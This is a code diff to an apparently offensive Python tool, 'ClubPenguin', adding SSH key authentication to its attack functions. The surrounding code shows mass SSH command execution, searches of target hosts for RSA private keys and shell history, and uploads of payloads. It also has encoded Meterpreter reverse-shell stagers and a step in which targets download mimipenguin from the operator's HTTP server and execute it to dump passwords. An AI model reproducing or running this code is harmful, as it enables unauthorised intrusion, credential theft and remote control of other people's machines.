@@ -29,12 +29,20 @@ def randomword(length):
    return ''.join(random.choice(letters) for i in range(length))
 
 
-def copy_exec(ip, username, password, file, timeout):
+def copy_exec(ip, username, password, identity_file, file, timeout):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
     try:
-        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        if identity_file:
+            key_path = identity_file
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+            if password:
+                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
+            else:
+                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
+        else:
+            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
         sftp = client.open_sftp()
         sftp.put('output/' + file, file)
         print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
@@ -53,12 +61,20 @@ def copy_exec(ip, username, password, file, timeout):
         print CRED + "[!] Authentication failed!" + CEND
 
 
-def steal(ip, username, password, type, timeout):
+def steal(ip, username, password, identity_file, type, timeout):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
     try:
-        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        if identity_file:
+            key_path = identity_file
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+            if password:
+                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
+            else:
+                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
+        else:
+            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
         if type == "keys":
             command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
         if type == "history":
@@ -86,12 +102,20 @@ def steal(ip, username, password, type, timeout):
         print CRED + "[!] Authentication failed!" + CEND
 
 
-def execute_command(ip, username, password, command, timeout):
+def execute_command(ip, username, password, identity_file, command, timeout):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
     try:
-        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        if identity_file:
+            key_path = identity_file
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+            if password:
+                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
+            else:
+                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
+        else:
+            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
         try:
             stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
             print CGREEN + "[+] Executed on " + str(ip) + "!" + CEND
@@ -110,20 +134,20 @@ def execute_command(ip, username, password, command, timeout):
 def start_thread(targets, function, args):
     for ip in targets:
         if function == "execute_command":
-            t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4]))
+            t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4],args[5]))
             t.start()
         time.sleep(.5)
         if function == "copy_exec":
-            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4]))
+            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4],args[5]))
             t.start()
         time.sleep(.5)
         if function == "steal":
-            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4]))
+            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4],args[5]))
             t.start()
         time.sleep(.5)
 
 
-def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password):
+def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password, identity_file):
     stager = '''
 import socket,struct,time
 for x in range(10):
@@ -143,10 +167,10 @@ exec(d,{'s':s})
     payload = base64.b64encode(stager, 'utf-8')
     print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
     command = "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &"
-    start_thread(targets, "execute_command", [22, username, password, command, 1])
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
 
 
-def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, password):
+def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, password, identity_file):
 
         stager = '''
     error_reporting(0);
@@ -204,7 +228,8 @@ def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, pass
         payload = base64.b64encode(stager, 'utf-8')
         print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
         command = "php -r 'eval(base64_decode(\"" + payload + "\"));'"
-        start_thread(targets, "execute_command", [22, username, password, command, 1])
+        start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
+
 
 def start_server(a,PORT):
     Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
@@ -220,13 +245,13 @@ def get_ip():
     return local_ip
 
 
-def mimipenguin(lhost, lport, targets, port, username, password):
+def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
     print CGREEN + "[!] Spinning up HTTP server..." + CEND
     thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
     time.sleep(3)
     command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
     print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
-    start_thread(targets, "execute_command", [22, username, password, command, 100])
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 100])
 
 
 def parse_targets(target):
@@ -319,7 +344,8 @@ def main():
     parser = argparse.ArgumentParser(description='ClubPenguin')
     parser.add_argument("first_arg", nargs=1)
     parser.add_argument('-u','--username', help='SSH username',required=True)
-    parser.add_argument('-p','--password',help='SSH password', required=True)
+    parser.add_argument('-p','--password',help='SSH password', required=False, default=False)
+    parser.add_argument('-i', '--identity_file', help='SSH key path', required=False, default=False)
     parser.add_argument('-x','--command',help='Command to execute', required=False)
     parser.add_argument('-m', '--module', help='Module to run', required=False)
     parser.add_argument('-o', '--options', help='Options for module', required=False)
@@ -329,7 +355,7 @@ def main():
 
     if args.command:
         print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
-        start_thread(targets, "execute_command", [22, args.username, args.password, args.command, 100])
+        start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, args.command, 10])
     if args.options:
         options = dict(x.split('=') for x in args.options.split(' '))
 
@@ -342,16 +368,16 @@ def main():
             except KeyError:
                 print "Must supply an LHOST for use with mimipenguin"
                 exit()
-        mimipenguin(get_ip(), lport, targets, 22, args.username, args.password)
+        mimipenguin(get_ip(), lport, targets, 22, args.username, args.password, args.identity_file)
 
 
     if args.module == "keys":
         print CGREEN + "[!] Searching system for private keys..." + CEND
-        start_thread(targets, "steal", [22, args.username, args.password, "keys", 100])
+        start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "keys", 100])
 
     if args.module == "history":
         print CGREEN + "[!] Searching system for command history..." + CEND
-        start_thread(targets, "steal", [22, args.username, args.password, "history", 100])
+        start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "history", 100])
 
 
     if args.module == "meterpreter":
@@ -373,13 +399,13 @@ def main():
         except KeyError:
             type = 'python'
         if type == 'python':
-            stager_meterpreter_python(m_ip, m_port, targets, 22, args.username, args.password)
+            stager_meterpreter_python(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
         if type == 'php':
-            stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password)
+            stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
             print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
-            start_thread(targets, "execute_command", [22, args.username, args.password, command, 2])
+            start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
         if type == 'osx':
             try:
                 m_ip = options['LHOST']
@@ -395,7 +421,7 @@ def main():
             filename = randomword(10)
             with open('output/' + filename, 'w') as file:
                 file.write(payload)
-            start_thread(targets, "copy_exec", [22, args.username, args.password, filename, 2])
+            start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, filename, 2])
 
 if __name__ == "__main__":
 
